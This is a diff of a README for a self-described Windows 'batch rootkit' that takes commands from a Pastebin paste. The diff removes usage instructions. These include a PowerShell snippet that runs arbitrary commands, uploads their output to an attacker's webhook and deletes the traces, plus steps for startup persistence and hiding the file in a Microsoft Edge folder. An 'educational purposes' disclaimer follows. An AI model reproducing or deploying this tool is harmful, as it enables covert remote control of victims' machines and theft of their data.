@@ -16,30 +16,6 @@ In case you require any assistance with my project, please do not hesitate to co
 ## About project
 Batch rootkit is using pastebin to control computer powershell. Nowadays, the code can be easily removed, and the link to Pastebin and commands can be readily accessible.
 
-## How to use
-1. Create account on Create paste on https://pastebin.com/
-2. Create paste on https://pastebin.com/
-3. Make paste to unlisted
-4. Change your webhook url and commend that you want to use
-```PowerShell
-$webhookUrl = "Your webhook url"
-$outputFile = "output.txt"
-$command = "Commend you want to use"
-Invoke-Expression "$command | Out-File -FilePath $outputFile"
-#tasklist | Out-File -FilePath $outputFile
-$client = New-Object System.Net.WebClient
-$client.UploadFile($webhookUrl, $outputFile)
-Remove-Item $outputFile
- ```
-5. To use cmd commend use ```cmd /c```  to use powershell commend just use your commend without ```cmd /c```
-6. Save your paste
-7. Press raw button
-8. Copy link
-9. Paste this link into batch code
-10. Change name of rootkit.bat to anything you want
-11. Done
-12. Now application will run on startup and will be stored in %localappdata%/Microsoft Edge
-
 ## Rules
 **IMPORTANT: ITS ROOTKIT SOFTWARE**
 1. This software is a rootkit intended solely for educational purposes. Using, distributing, or modifying this software in a manner that violates applicable laws is strictly prohibited.
